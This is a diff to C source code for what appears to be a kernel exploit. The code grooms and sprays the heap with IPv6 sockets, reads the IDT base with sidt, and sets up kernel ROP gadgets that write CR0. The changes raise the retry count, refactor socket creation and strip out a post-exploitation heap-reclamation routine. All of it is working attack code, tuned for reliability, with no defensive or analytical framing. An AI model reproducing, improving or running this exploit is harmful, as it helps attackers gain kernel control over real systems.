@@ -22,17 +22,15 @@
 #define TCLASS_TAINT 0x42
 #define SPRAY_SIZE 32
 #define SPRAY_TOTAL 512
+#define NEW_SOCKET() socket(AF_INET6, SOCK_DGRAM, 0)
 
 #define NANOSLEEP_100US "\0\0\0\0\0\0\0\0\xa0\x86\x01\0\0\0\0\0"
 #define NANOSLEEP_75US  "\0\0\0\0\0\0\0\0\xf8\x24\x01\0\0\0\0\0"
 #define NANOSLEEP_50US  "\0\0\0\0\0\0\0\0\x50\xc3\0\0\0\0\0\0"
 #define NANOSLEEP_10US  "\0\0\0\0\0\0\0\0\x10\x27\0\0\0\0\0\0"
 
-#define MAX_ATTEMPTS 10
+#define MAX_ATTEMPTS 20
 #define HEAP_GROOM_COUNT 100
-#define AGGRESSIVE_RECLAIM_PASSES 5
-#define AGGRESSIVE_SOCKETS_PER_PASS 256
-#define POST_KROP_CLEANUP_PASSES 4
 
 #define DEFRAG_PASSES 3
 #define DEFRAG_SMALL_SOCKETS 32
@@ -96,7 +94,7 @@ int fast_new_socket(void)
         return sock;
     }
 
-    return socket(AF_INET6, SOCK_DGRAM, 0);
+    return NEW_SOCKET();
 }
 
 // Store socket cache
@@ -345,25 +343,6 @@ void sidt(unsigned long long* addr, unsigned short* size) {
     *addr = *(unsigned long long*)(buf + 2);
 }
 
-void aggressive_heap_reclamation() {
-    for (int pass = 0; pass < AGGRESSIVE_RECLAIM_PASSES; pass++) {
-        int reclaim_sockets[AGGRESSIVE_SOCKETS_PER_PASS];
-
-        for (int i = 0; i < AGGRESSIVE_SOCKETS_PER_PASS; i++) {
-            reclaim_sockets[i] = fast_new_socket();
-
-            if (reclaim_sockets[i] >= 0)
-                reset_ipv6_opts(reclaim_sockets[i]);
-        }
-
-        nanosleep(NANOSLEEP_10US, NULL);
-
-        for (int i = AGGRESSIVE_SOCKETS_PER_PASS - 1; i >= 0; i--) {
-            if (reclaim_sockets[i] >= 0)
-                cache_socket(reclaim_sockets[i]);
-        }
-    }
-}
 
 void flush_ipv6_option_pools() {
     int flush_sockets[128];
@@ -467,7 +446,7 @@ int main() {
         return 179;
 
     for (int i = 0; i < 16; i++)
-        fast_new_socket();
+        NEW_SOCKET();
 
     uint64_t idt_base;
     uint16_t idt_size;
@@ -481,13 +460,13 @@ int main() {
     krop_read_cr0_2 = kernel_base + 0xa1b70;
     krop_write_cr0 = kernel_base + 0xa1b79;
 
-    int kevent_sock = fast_new_socket();
-    int master_sock = fast_new_socket();
+    int kevent_sock = NEW_SOCKET();
+    int master_sock = NEW_SOCKET();
     krop_master_sock = master_sock * 8;
 
     // Phase 1 - Heap grooming
     for (int i = 0; i < HEAP_GROOM_COUNT; i++) {
-        int s = socket(AF_INET6, SOCK_DGRAM, 0);
+        int s = NEW_SOCKET();
         if (s >= 0) {
             reset_ipv6_opts(s);
             safe_close_socket(s);
@@ -499,7 +478,7 @@ int main() {
     // Phase 2 - SPRAY
     int spray_sock[SPRAY_TOTAL];
     for (int i = 0; i < SPRAY_TOTAL; i++) {
-        spray_sock[i] = socket(AF_INET6, SOCK_DGRAM, 0);
+        spray_sock[i] = NEW_SOCKET();
         if (spray_sock[i] < 0)
             *(volatile int*)0;
     }
@@ -544,7 +523,7 @@ int main() {
 
         int overlap_sock = spray_sock[overlap_idx];
         cache_socket(overlap_sock);
-        spray_sock[overlap_idx] = fast_new_socket();
+        spray_sock[overlap_idx] = NEW_SOCKET();
         if (spray_sock[overlap_idx] < 0)
             *(volatile int*)0;
 
@@ -554,7 +533,7 @@ int main() {
 
         overlap_sock = spray_sock[overlap_idx];
         cache_socket(overlap_sock);
-        spray_sock[overlap_idx] = fast_new_socket();
+        spray_sock[overlap_idx] = NEW_SOCKET();
         if (spray_sock[overlap_idx] < 0)
             *(volatile int*)0;
 
@@ -611,15 +590,6 @@ int main() {
 
         nanosleep(NANOSLEEP_50US, NULL);
 
-        for (int post_krop_pass = 0; post_krop_pass < POST_KROP_CLEANUP_PASSES; post_krop_pass++) {
-            aggressive_heap_reclamation();
-
-            if (post_krop_pass % 2 == 1) {
-                flush_ipv6_option_pools();
-            }
-
-            nanosleep(NANOSLEEP_100US, NULL);
-        }
     }
 
     comprehensive_cleanup(&cleanup_state);
